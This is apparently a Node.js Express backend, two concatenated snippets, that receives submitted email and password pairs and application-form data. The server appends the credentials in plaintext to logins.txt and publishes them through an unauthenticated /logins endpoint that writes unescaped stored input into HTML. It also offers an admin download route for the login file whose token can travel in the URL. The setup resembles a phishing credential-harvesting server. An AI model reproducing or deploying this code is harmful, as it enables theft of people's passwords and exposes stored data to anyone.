const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (optional if you want to host HTML from backend)
app.use(express.static(path.join(__dirname, '../')));

// Save login info
app.post('/save-login', (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).send({ error: 'Missing email or password' });
    fs.appendFileSync('logins.txt', `Email: ${email}, Password: ${password}\n`);
    res.send({ status: 'ok' });
});

// Save application form
app.post('/save-application', (req, res) => {
    const form = req.body;
    fs.appendFileSync('applications.json', JSON.stringify(form) + '\n');
    res.send({ status: 'ok' });
});

// View saved logins (for testing)
app.get('/logins', (req, res) => {
    const data = fs.existsSync('logins.txt') ? fs.readFileSync('logins.txt', 'utf-8') : '';
    res.send(`<pre>${data}</pre>`);
});

// View saved applications (for testing)
app.get('/applications', (req, res) => {
    const data = fs.existsSync('applications.json') ? fs.readFileSync('applications.json', 'utf-8') : '';
    res.send(`<pre>${data}</pre>`);
});

app.listen(3000, () => console.log('Server running at http://localhost:3000'));


const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Protect with an admin token stored in Render environment variables
const ADMIN_TOKEN = process.env.ADMIN_TOKEN; // set this in Render dashboard

app.get('/admin/download-login-file', (req, res) => {
  const token = req.headers['x-admin-token'] || req.query.token;
  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) {
    return res.status(401).send('Unauthorized');
  }

  const filePath = path.join(__dirname, 'login.txt'); // or './login.txt' or path to file
  if (!fs.existsSync(filePath)) return res.status(404).send('Not found');

  res.download(filePath, 'login.txt', err => {
    if (err) {
      console.error('Download error', err);
      if (!res.headersSent) res.status(500).send('Error sending file');
    }
  });
});

